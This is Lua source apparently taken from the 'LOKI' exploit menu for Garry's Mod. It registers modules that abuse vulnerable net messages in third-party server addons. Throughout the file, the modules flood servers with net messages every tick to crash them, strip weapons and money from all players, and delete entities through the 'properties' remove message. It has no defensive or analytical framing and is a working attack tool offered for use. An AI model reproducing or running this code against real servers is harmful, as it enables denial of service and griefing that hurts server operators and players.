LOKI.AddExploit( "Server Crasher", {
    desc = "Open the floodgates",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("dialogAlterWeapons") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "dialogAlterWeapons", true)
            net.WriteString("Add")
            net.WriteTable({[1] = "worldspawn"})
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Server Crasher", {
    desc = "Burn the books",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString("hcLog") end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart(sploit, "hcLog", true)
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )
/*LOKI.AddExploit( "Server Crasher", {
    desc = "Fuel is flammable? Who knew!",
    severity = 100,
    bools = {enabled = false},
    status = 1,
    times_per_tick = math.huge,
    scan = function() return LOKI.ValidNetString( "simfphys_gasspill" ) end,
    hooks = {
        Think = function(tbl, sploit)
            LOKI.NetStart( sploit, "simfphys_gasspill" )
            net.SendToServer()
        end,
    },
    functions = {
        { typ = "bool", },
    },
} )*/
 
LOKI.AddExploit( "Strip Weapons", {
    desc = "Strip weapons/money from everybody",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "drugseffect_remove" ) end,
    hooks = {
        Think = function(tbl, sploit)
            if(tbl[1] == 1) then
                LOKI.NetStart( sploit, "drugseffect_remove")
                net.SendToServer()
            elseif(tbl[1] == 2) then
                LOKI.NetStart( sploit, "drugs_money")
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "func", Name = "Strip Weapons", args = {1}, },
        { typ = "func", Name = "Strip Money", args = {2}, },
    },
} )
LOKI.AddExploit( "Strip Weapons", {
    desc = "Prevent players from using their weapons",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "Cover_WheelU" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "stripper2_plyz", {} ) ) do
                local weaps = v:GetWeapons()
                LOKI.NetStart(sploit, "Cover_WheelU") --Cover_WheelD works too
                net.WriteEntity(v)
                net.WriteTable({weaps[math.random(#weaps)], weaps[math.random(#weaps)]})
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "stripper2_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Strip Weapons", {
    desc = "Prevent players from using their weapons",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "DCHOLDSTER" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "stripper3_plyz", {} ) ) do
                if(!IsValid(v) || !IsValid(v:GetActiveWeapon())) then continue end
                local weaps = v:GetWeapons()
                LOKI.NetStart(sploit, "DCHOLDSTER")
                net.WriteEntity(v:GetActiveWeapon())
                net.WriteString(weaps[math.random(#weaps)]:GetClass())
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "stripper3_plyz" },
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Strip Weapons", {
    desc = "Automatically prevent all mass shootings",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "STOOL_FISHSPOT_REMOVE" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "stripper4_plyz", {} ) ) do
                if(!IsValid(v) || !IsValid(v:GetActiveWeapon())) then continue end
                LOKI.NetStart(sploit, "STOOL_FISHSPOT_REMOVE")
                net.WriteEntity(v:GetActiveWeapon())
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "stripper4_plyz" },
        { typ = "bool", },
    },
} ) 
LOKI.AddExploit( "Strip Weapons", {
    desc = "Automatically enforce gun control laws",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "DestroyTable" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "stripper5_plyz", {} ) ) do
                if(!IsValid(v) || !IsValid(v:GetActiveWeapon())) then continue end
                LOKI.NetStart(sploit, "DestroyTable")
                net.WriteEntity(v:GetActiveWeapon())
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "stripper5_plyz" },
        { typ = "bool", },
    },
} )
LOKI.AddExploit( "Strip Weapons", {
    desc = "Remove the guns from the hands of the criminals",
    severity = 90,
    bools = {enabled = false},
    status = 1,
    times_per_tick = 1,
    vars = {},
    scan = function() return LOKI.ValidNetString( "AS_DoAttack" ) end,
    hooks = {
        Think = function(tbl, sploit)
            for k, v in ipairs( LOKI.GetStored( "stripper6_plyz", {} ) ) do
                if(!IsValid(v) || !IsValid(v:GetActiveWeapon())) then continue end
                LOKI.NetStart(sploit, "AS_DoAttack")
                net.WriteTable({Weapon = v:GetActiveWeapon():EntIndex(), Target = 0})
                net.SendToServer()
            end
        end,
    },
    functions = {
        { typ = "players", addr = "stripper6_plyz" },
        { typ = "bool", },
    },
} ) 
LOKI.LNextNuke = {}
function LOKI.NukeWeapon( ent, sploit )
    if !ent:IsValid() then return end
    if LOKI.LNextNuke[ent] and LOKI.LNextNuke[ent] > SysTime() then return end
    LOKI.NetStart( sploit, "properties")
    net.WriteString("remove")
    net.WriteEntity( ent )
    net.SendToServer()
    LOKI.LNextNuke[ent] = SysTime() + 0.5
end
function LOKI.RemoveEnts( tab, sploit )
    for k, v in pairs( tab ) do
        if !v:IsValid() then continue end
        if LOKI.LNextNuke[v] and LOKI.LNextNuke[v] > SysTime() then continue end
        LOKI.NetStart( sploit, "properties")
        net.WriteString("remove")
        net.WriteEntity( v )
        net.SendToServer()
    end
end
LOKI.OpenMenu(true)